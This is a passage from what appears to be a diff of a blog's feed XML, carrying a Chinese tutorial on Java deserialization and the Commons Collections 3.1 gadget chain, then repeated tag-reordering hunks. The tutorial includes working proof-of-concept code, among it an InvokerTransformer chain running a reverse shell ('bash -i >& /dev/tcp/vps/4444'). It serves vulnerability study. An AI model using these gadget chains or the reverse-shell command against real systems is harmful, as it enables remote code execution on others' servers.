    ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOut);<br>        out.writeObject(s);<br>        fileOut.close();<br>        System.out.println(<span class="hljs-string">&quot;serialize ok &quot;</span>);<br><br>        SerialObject p = <span class="hljs-keyword">null</span>;<br>        FileInputStream filein = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br>        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(filein);<br>        p = (SerialObject) in.readObject();<br>        in.close();<br>        filein.close();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerialObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> seriaverionuid = <span class="hljs-number">513134543743755L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SerialObject</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id,String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span><span class="hljs-keyword">throws</span> IOException,ClassNotFoundException</span>&#123;<br>        in.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>但在某些情况下可能是更高的数字。</p><p>Java类名称可能会以“L”开头的替代格式出现 ，以’;’结尾 ，并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的’sr’或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的’xp’。</p><p>序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></p><p>在实战过程中，我们可以通过tcpdump抓取TCP/HTTP请求，通过<a href="https://github.com/NickstaDB/SerialBrute/">SerialBrute.py</a>去自动化检测，并插入ysoserial生成的exp</p><p><img src="https://img-blog.csdnimg.cn/13cdbe6f5635452ebd0122ef527efa9a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>感觉主要是要注意一些库中存在得反序列化漏洞。</p><p>注意找出反序列化函数调用点：</p><ul><li>ObjectInputStream.readObject</li><li>ObjectInputStream.readUnshared</li><li>XMLDecoder.readObject</li><li>yaml.load</li><li>XStream.fromXML</li><li>ObjectMapper.readValue</li><li>JSON.parseObject</li></ul><h2 id="关于java反射"><a href="#关于java反射" class="headerlink" title="关于java反射"></a>关于java反射</h2><p>参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448</a></p><p>反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。</p><p>正常情况下，如果我们要调用一个对象的方法，或者访问一个对象的字段，通常会传入对象实例：</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript"><span class="hljs-comment">// Main.java</span><br><span class="hljs-keyword">import</span> com.itranswarp.learnjava.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params">Person p</span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> p.getFirstName() + <span class="hljs-string">&quot; &quot;</span> + p.getLastName();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>但是，如果不能获得<code>Person</code>类，只有一个<code>Object</code>实例，比如这样：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> ???<br>&#125;<br></code></pre></div></td></tr></table></figure><p>怎么办？有童鞋会说：强制转型啊！</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getFullName</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>)</span> &#123;<br>    Person p = (Person) obj;<br>    <span class="hljs-keyword">return</span> p.getFirstName() + <span class="hljs-string">&quot; &quot;</span> + p.getLastName();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>强制转型的时候，你会发现一个问题：编译上面的代码，仍然需要引用<code>Person</code>类。不然，去掉<code>import</code>语句，你看能不能编译通过？</p><p>所以，反射是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法。</p><p>关于反射的实例化一些方法</p><p><code>forName </code></p><p> forName是一个静态方法，其作用：通过调用来获取类名对应的Class对象，同时将Class对象加载进来。</p><p><code>newInstance</code></p><p>将对象实例化。返回类型为Object。与new的区别在于，new可以带参，而newInstance（）不可以，一边初始化无参类。通常与forName()配合使用。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String str = <span class="hljs-string">&quot;java.util.Date&quot;</span>;<br>Class cl1= Class.forName(str);<span class="hljs-comment">//加载java.util.Date类</span><br>Object obj = cl1.newInstance();<span class="hljs-comment">//实例化cl1</span><br></code></pre></div></td></tr></table></figure><p>最后一个是直接用new 来实例化也是很常用的方法。</p><p>还有一些关键的方法</p><p><code>getMethod()</code>  Method getMethod(String name,Class…parameterTypes)</p><p>getMethod方法与getField方法类似，getField方法根据表示域名的字符串，返回一个Field对象。而getMethod方法则根据方法名称和相关参数，来定位需要查找的Method对象并返回。</p><p>getMethod与getDeclareMethods方法的区别在于，后者返回一个Method对象数组，需要自己在结果中查找所需Method对象。</p><p><code>invoke</code>Object invoke（Object obj,Object…args）obj：实例化后的对象,args：用于方法调用的参数</p><p>调用包装在当前Method对象中的方法</p><p>常用的还有<strong>java.lang.Class.getMethod（）</strong></p><h2 id="反序列化一般攻击过程"><a href="#反序列化一般攻击过程" class="headerlink" title="反序列化一般攻击过程"></a>反序列化一般攻击过程</h2><p>在开始之前我们需要理一下反序列化漏洞的攻击流程：</p><ol><li>客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）</li><li>exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）</li><li>这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3……</li><li>最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。</li></ol><p>那么以上大概可以分成三个主要部分：</p><ol><li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload</li><li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li><li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…</li></ol><h2 id="初试CC3-1反序列化漏洞"><a href="#初试CC3-1反序列化漏洞" class="headerlink" title="初试CC3.1反序列化漏洞"></a>初试CC3.1反序列化漏洞</h2><p>看cc库漏洞之前得先了解了解cc库得一下接口和函数得实现。</p><p>这里Map类是存储键值对的数据结构，Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种变换，只要调用decorate()函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()函数如下</p><p><img src="https://img-blog.csdnimg.cn/a5cc0eca263b485c8521ffece0db2b6d.png" alt="在这里插入图片描述"></p><p>Transformer是一个接口，其中定义的transform()函数用来将一个对象转换成另一个对象。如下所示：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span> </span>&#123;  <br><br> <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span></span>;  <br><br>&#125; <br></code></pre></div></td></tr></table></figure><p>当Map中的任意项的Key或者Value被修改，相应的Transformer就会被调用。除此以外，多个Transformer还能串起来，形成ChainedTransformer。</p><p>Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以通过调用Java的反射机制来调用任意函数，叫做InvokerTransformer。这也是这个漏洞触发得核心。看一下InvokerTransformer的源码定义</p><h3 id="poc链分析"><a href="#poc链分析" class="headerlink" title="poc链分析"></a>poc链分析</h3><p>先看一下核心得触发漏洞得地方</p><p><img src="https://img-blog.csdnimg.cn/9414e8841c984f0fbb589605d577b0e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里得三个参数都是我们可控的，可以看到 InvokerTransformer 类中实现的 transform() 接口使用 Java 反射机制获取反射对象 input 中的参数类型为 iParamTypes 的方法 iMethodName，然后使用对应参数 iArgs 调用获取的方法，并将执行结果返回。由于其实现了 Serializable 接口，因此其中的三个必要参数 iMethodName、iParamTypes 和 iArgs 都是可以通过序列化直接构造的，为命令执行创造的决定性的条件。</p><p>然后要想利用 InvokerTransformer 类中的 transform() 来达到任意命令执行，还需要一个入口点，使得应用在反序列化的时候能够通过一条调用链来触发 InvokerTransformer 中的 transform() 接口。这里寻找过后发现了<code>TransformedMap</code>下存在<code>put</code>方法</p><p><img src="https://img-blog.csdnimg.cn/998ab566576542a4ac33ac4fd1a22d22.png" alt="在这里插入图片描述"></p><p>跟进后可以发现这里存在调用transform函数只需要将成员变量里的一个<code>valuetransformer</code>设置为一个<code>InvokerTransformer</code>类即可触发</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106222354207.png" alt="image-20211106222354207"></p><p>还有一些细节的东西，这里直接看pop链。这里为了最后能够获得<code>exec</code>函数执行命令，需要调用多次反射，所以需要将多个 InvokerTransformer 实例级联在一起组成一个 ChainedTransformer 对象，在其调用的时候会进行一个级联 transform() 调用：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CC3_1.serialize;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commons_collections_3_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] test = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/4444 0&gt;&amp;1&quot;</span>&#125;<br>                )<br>                &#125;;<br>        Transformer transformerChain =<span class="hljs-keyword">new</span> ChainedTransformer(test);<br><br>        Map tempMap = <span class="hljs-keyword">new</span> HashMap&lt;String, Object&gt;();<br>        Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        exMap.put(<span class="hljs-string">&quot;1111&quot;</span>, <span class="hljs-string">&quot;2222&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>跟进到put函数时栈情况</p><p><img src="https://img-blog.csdnimg.cn/c831b5c2aa304e578922ba3cb01e23a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>初始化时<code>Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, null, transformerChain);</code>这里<code>this.valueTransformer</code>不为空所以进入到<code>transform</code>函数</p><p><img src="https://img-blog.csdnimg.cn/e71c8b9720f448ba8096f27e1d089a39.png" alt="在这里插入图片描述"></p><p>多级链多次调用反射</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106223219346.png" alt="image-20211106223219346"></p><p>最后一次循环得到<code>exec</code>函数，这里的反射调用需要自己多多理解和调试一下。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106223349029.png" alt="image-20211106223349029"></p><p>最终反弹到shell</p><p><img src="https://img-blog.csdnimg.cn/abb260c30635482bad208db339973ea6.png" alt="在这里插入图片描述"></p><p>整条链多调试和理解感觉还是很清晰和顺利的，这里网上似乎还有另一个方法。利用<code>Map.Entry</code>的<code>setValue</code>函数来触发漏洞，poc主函数如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span><br>Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br><span class="hljs-comment">//创建Map并绑定transformerChina</span><br>Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-comment">//给予map数据转化链</span><br>Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br><span class="hljs-comment">//触发漏洞</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br><span class="hljs-comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br>onlyElement.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>关键在于AbstracInputCheckedMapDecorator.class类中的<code>setValue</code>会进入到<code>TransformedMap</code>中的<code>checkSetValue</code>,后面大致就一样了。</p><p><img src="https://img-blog.csdnimg.cn/3a829cbc792b48b682e508fccad5cc45.png" alt="在这里插入图片描述"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106231618609.png" alt="image-20211106231618609"></p><p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Map.Entry 类型setValue(<span class="hljs-string">&quot;foobar&quot;</span>)<br>=&gt; AbstracInputCheckedMapDecorator.setValue()<br>=&gt; TransformedMap.checkSetValue()<br>=&gt; ChainedTransformer.transform(Object object)<br>    根据数组，先进入 =&gt; ConstantTransformer.transform(Object input)<br>    再进入 =&gt; InvokerTransformer.transform(Object input)<br></code></pre></div></td></tr></table></figure><p>获取exec的反射调用流程为</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>.invoke(<br>Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))<span class="hljs-comment">//此处在获取实例</span><br>,<br><span class="hljs-string">&quot;calc.exe&quot;</span><br>)<br></code></pre></div></td></tr></table></figure><p>但是到这里都还只是停留在本地测试出了命令执行，要想在 Java 应用反序列化的过程中触发该过程还需要找到一个类，它能够在反序列化调用 readObject() 的时候调用 TransformedMap 内置类 MapEntry 中的 setValue() 函数，这样才能构成一条完整的 Gadget 调用链。恰好在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类具有 Map 类型的参数，并且在<code> readObject()</code> 方法中触发了上面所提到的所有条件，其源码如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> </span>&#123;<br>        ...省略...<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            String name = memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                Object value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>关键在于</p><p><code>memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name)));</code>调用了setValue函数，但是这是jdk1.7的版本，在jdk1.8中便不适用</p><p>也可以看看jdk1.8版本</p><p><img src="https://img-blog.csdnimg.cn/855de5736d904193835ae8bb04354f86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
     
     
     <categories>
@@ -128,9 +317,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -155,9 +344,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -182,9 +371,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -209,9 +398,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -236,9 +425,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -263,9 +452,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -290,9 +479,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -317,9 +506,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -369,9 +558,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -396,9 +585,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -423,9 +612,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -450,9 +639,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -477,9 +666,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -504,9 +693,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -531,9 +720,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -558,9 +747,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
@@ -585,9 +774,9 @@
     
     <tags>
       
-      <tag>ctf</tag>
-      
       <tag>web</tag>
+      
+      <tag>ctf</tag>
       
     </tags>
     
